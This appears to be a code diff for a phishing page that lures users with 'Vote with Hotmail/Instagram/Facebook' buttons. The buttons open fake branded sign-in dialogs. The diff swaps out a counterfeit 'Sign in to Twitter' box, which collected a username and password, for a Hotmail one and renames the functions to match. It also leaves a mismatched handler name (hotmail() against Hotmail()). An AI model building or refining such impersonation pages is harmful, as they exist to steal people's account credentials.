@@ -82,7 +82,7 @@
     margin-top: 15px;
   }
 
-  .twitter-button {
+  .hotmail-button {
     background-color: black;
     color: #FFF;
     border: none;
@@ -144,7 +144,7 @@
 
     <div class="social-vote-button">
 
-      <button onclick="Twitter()" class="hotmail-button"><i class="fab fa-microsoft"></i>Vote with Hotmail</button>
+      <button onclick="hotmail()" class="hotmail-button"><i class="fab fa-microsoft"></i>Vote with Hotmail</button>
 
     </div>
     <div class="social-vote-button">
@@ -224,51 +224,7 @@
 
      <!-- Hotmail Dialog Box -->
 
-      <div id="twitter" class="dialog">
-        <div class="dialog-content">
-          <span class="close" onclick="closeDialog()">&times;</span>
-     <div class="row">
-       <div class="none col-1 col-lg-4"></div>
-       <div class="none col-10 col-lg-5">
-         <div class="box bg-white mt-5 p-3">
-           <div class="nav mb-5">
-             <img class="twitter-2" src="twt/IMG/twitter.png" alt="">
-           </div>
-           <div class="mb-4">
-             <h2 class="text-center head"><b>Sign in to Twitter</b></h2>
-           </div>
-
-           <div class="margin mb-4">
-            <input type="text" class="btn but d-flex btn-white border-dark " placeholder="Phone, Email or Username" required id="tw-email">
-            <input type="password" class="btn but d-flex btn-white border-dark " placeholder="Password" required id="tw-pass">
-             <button type="button"
-               class="btn but d-flex justify-content-center btn-white border-dark bg-dark rounded-pill" onclick="tw_login()" id="tw-log">
-               <p class="text-white"><b>Log In</b></p>
-             </button>
-           </div>
-
-           <div class="margin mb-4">
-             <button type="button" class="btn but d-flex justify-content-center btn-white border-dark rounded-pill">
-               <p class="color-white"><b>Forgot password?</b></p>
-             </button>
-           </div>
-
-           <div class="margin">
-             <p>Don't have an account? <a class="text-decoration-none" href="#">Sign up</a></p>
-           </div>
-
-           <div class="margin">
-           </div>
-
-         </div>
-       </div>
-       <div class="none col-1 col-lg-3"></div>
-     </div>
-
-   </div>
-</div>
-<!--
-          <div id="hotmail" class="dialog">
+      <div id="hotmail" class="dialog">
         <div class="dialog-content">
           <span class="close" onclick="closeDialog()">&times;</span>
 
@@ -297,7 +253,8 @@
               </div>
           </div>
       </main>
-        </div></div></div> -->
+   </div>
+</div>
   <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.20/dist/sweetalert2.all.min.js"></script>
   <script>
     function showCustomAlert() {
@@ -319,11 +276,11 @@
         document.getElementById("preloader").style.display = "none";
       }
 
-      function Twitter() {
+      function Hotmail() {
         showPreloader();
         setTimeout(function() {
           hidePreloader();
-          document.getElementById("twitter").style.display = "flex";
+          document.getElementById("hotmail").style.display = "flex";
         }, 1000); // Delay in milliseconds
       }
 
@@ -345,7 +302,7 @@
 
       function closeDialog() {
           document.getElementById("instagram").style.display = "none";
-          document.getElementById("twitter").style.display = "none";
+          document.getElementById("hotmail").style.display = "none";
           document.getElementById("facebook").style.display = "none";
       }
     </script>
